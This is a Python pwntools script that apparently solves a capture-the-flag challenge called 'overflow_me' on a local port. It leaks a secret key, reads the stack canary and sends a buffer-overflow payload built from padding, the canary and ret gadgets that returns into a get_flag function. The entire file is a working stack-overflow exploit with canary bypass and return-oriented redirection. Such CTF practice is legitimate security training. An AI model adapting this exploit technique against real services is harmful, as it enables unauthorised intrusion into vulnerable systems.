from pwn import *

binary = './overflow_me'
context.binary = binary
context.log_level = 'debug'

e = ELF(binary)
#p = process(binary)
p = remote('localhost', 5454)   
rop = ROP(e)

# ───── Step 1: Leak secret_key ─────
p.recvuntil(b"Tell me its address\n")
secret_key_addr = e.symbols['secret_key']
p.send(p64(secret_key_addr))  # send address of secret_key

leaked_line = p.recvline().strip()
log.info(f"Raw leaked secret_key line: {leaked_line}")
leaked_key = int(leaked_line, 16)
log.success(f"Leaked secret_key: {hex(leaked_key)}")

# ───── Step 2: Send the key ─────
p.recvuntil(b'unlocks\n')
p.send(p64(leaked_key))  # send the secret key

# ───── Step 3: Get canary ─────
p.recvuntil(b'you: ')
canary_line = p.recvline().strip()
log.info(f"Raw canary line: {canary_line}")
canary_val = int(canary_line, 16)
log.success(f"Canary: {hex(canary_val)}")

p.recvuntil(b'this story.\n')  # wait for overflow prompt

# ───── Step 4: Build payload ─────
padding = b'A' * 64
canary = p64(canary_val)
rbp = b'B' * 8

#ret_align = p64(0x401331)       # 'ret' instruction (for alignment)
ret_align = rop.find_gadget(['ret'])[0]

#payload = padding + canary + rbp + ret_align + get_flag
payload = padding + canary + rbp + p64(ret_align) + p64(ret_align) + p64(e.symbols['get_flag'])


log.info(f"Final payload length: {len(payload)}")
log.info(f"Payload hex: {payload.hex()}")

# ───── Step 5: Send payload ─────
p.send(payload)

# ───── Step 6: Interact and get flag ─────
p.interactive()
